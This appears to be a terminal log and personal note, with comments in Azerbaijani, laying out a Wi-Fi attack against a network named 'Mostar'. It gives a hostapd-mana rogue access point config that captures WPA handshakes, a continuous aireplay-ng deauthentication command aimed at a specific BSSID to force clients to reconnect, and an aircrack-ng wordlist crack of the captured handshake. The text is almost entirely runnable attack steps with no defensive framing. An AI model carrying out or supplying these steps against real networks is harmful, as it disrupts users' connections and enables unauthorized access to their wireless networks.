kali@kali:~$ cat Mostar-mana.conf
```
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 

ise salan kimi clientleri ayirib, tezeden qosulmaga mecbur eliyirik

kali@kali:~$ sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon


aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst

sonrada sindir getsin
